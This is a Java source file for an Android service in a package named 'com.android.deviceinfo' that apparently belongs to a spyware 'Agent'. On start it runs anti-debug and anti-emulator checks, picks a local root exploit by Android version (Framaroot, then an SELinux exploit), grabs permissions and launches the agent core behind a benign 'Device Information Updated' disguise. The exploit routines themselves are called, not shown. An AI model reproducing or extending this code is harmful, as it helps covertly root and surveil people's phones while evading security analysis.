package com.android.deviceinfo;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.content.res.Configuration;
import android.os.IBinder;
import android.widget.Toast;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.capabilities.PackageInfo;
import com.android.deviceinfo.util.Check;
import com.android.m.M;

/**
 * The Class ServiceCore.
 */
public class ServiceMain extends Service {
	private static final String TAG = "ServiceCore"; //$NON-NLS-1$
	private boolean needsNotification = false;
	private Core core;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();

		Status.setAppContext(getApplicationContext());
		
		// ANTIDEBUG ANTIEMU
		if (!Core.checkStatic()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onCreate) anti emu/debug failed");
			}
			return;
		}

		//M.init(getApplicationContext());

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
		}

		// TODO: verificare che needsNotification serva.
		needsNotification = false; // Root.isNotificationNeeded();

		// E' sempre false se Cfg.ACTIVITY = false
		if (needsNotification == true) {
			Notification note = new Notification(R.drawable.notify_icon, "Device Information Updated",
					System.currentTimeMillis());

			Intent i = new Intent(this, LocalActivity.class);

			i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);

			PendingIntent pi = PendingIntent.getActivity(this, 0, i, 0);

			// Activity Name and Displayed Text
			note.flags |= Notification.FLAG_AUTO_CANCEL;
			note.setLatestEventInfo(this, "", "", pi);

			startForeground(1260, note);
		}
		
		if (Cfg.DEMO) {
			Toast.makeText(this, M.e("Agent Created"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}
	}

	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onStart)"); //$NON-NLS-1$
		}

		// ANTIDEBUG ANTIEMU
		if (Core.checkStatic()) {
			if (Root.isRootShellInstalled() == false) { // Exploitation required
				// <= 2.1 is a bit too old
				if (android.os.Build.VERSION.SDK_INT <= android.os.Build.VERSION_CODES.ECLAIR_MR1) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(onStart): Android <= 2.1, version too old");
					}
					
				    return;
				} else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.FROYO && android.os.Build.VERSION.SDK_INT <= 13) { // FROYO - HONEYCOMB_MR2
					// Framaroot
					if (Cfg.DEBUG) {
						Check.log(TAG + "(onStart): Android 2.2 to 3.2 detected attempting Framaroot");
					}
					
					if (Root.checkFramarootExploitability()) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (onStart): Device seems locally exploitable"); //$NON-NLS-1$
						}
						
						Root.framarootExploit();
					}
				} else if (android.os.Build.VERSION.SDK_INT >= 14 && android.os.Build.VERSION.SDK_INT <= 17) { // ICE_CREAM_SANDWICH - JELLY_BEAN_MR1 
					if (Cfg.DEBUG) {
						Check.log(TAG + "(onStart): Android 4.0 to 4.2 detected attempting Framaroot then SELinux exploitation");
					}
					
					if (Root.checkFramarootExploitability()) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (onStart): Device seems locally exploitable"); //$NON-NLS-1$
						}
						
						Root.framarootExploit();
					}
					
					if (PackageInfo.checkRoot() == false) {
						if (Cfg.DEBUG) {
							Check.log(TAG + "(onStart): Framaroot exploitation failed, using SELinux exploitation");
						}
						
						if (Root.checkSELinuxExploitability()) {
							if (Cfg.DEBUG) {
								Check.log(TAG + " (onStart): SELinux Device seems locally exploitable"); //$NON-NLS-1$
							}
							
							Root.selinuxExploit();
						}
					}
				} else if (android.os.Build.VERSION.SDK_INT == 18) { // JELLY_BEAN_MR2
					if (Cfg.DEBUG) {
						Check.log(TAG + "(onStart): Android 4.3 detected attempting SELinux exploitation");
					}
					
					if (Root.checkSELinuxExploitability()) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (onStart): SELinux Device seems locally exploitable"); //$NON-NLS-1$
						}
						
						Root.selinuxExploit();
					}
				} else if (android.os.Build.VERSION.SDK_INT >= 19) { // KITKAT+
					// Nada
					if (Cfg.DEBUG) {
						Check.log(TAG + "(onStart): Android >= 4.4 detected, nope nope");
					}
				}
			}
			
			Root.getPermissions();
			
			// Core starts
			core = Core.newCore(this);
			core.Start(this.getResources(), getContentResolver());
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onStart) anti emu/debug failed");
				Toast.makeText(Status.getAppContext(), M.e("Debug Failed!"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
			}
		}
	}

	@Override
	public void onConfigurationChanged(Configuration newConfig) {
		super.onConfigurationChanged(newConfig);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onConfigurationChanged)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, M.e("(onConfigurationChanged)"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}
	}

	@Override
	public void onLowMemory() {
		super.onLowMemory();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onLowMemory)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, M.e("(onLowMemory)"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}
	}

	@Override
	public void onRebind(Intent intent) {
		super.onRebind(intent);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onRebind)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, M.e("(onRebind)"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}
	}

	@Override
	public boolean onUnbind(Intent intent) {
		boolean ret = super.onUnbind(intent);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onUnbind)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, M.e("(onUnbind)"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}

		return ret;
	}

	@Override
	public void onDestroy() {
		super.onDestroy();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onDestroy)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, M.e("Agent Destroyed"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}

		core.Stop();
		core = null;

		if (needsNotification == true) {
			stopForeground(true);
		}
	}

}
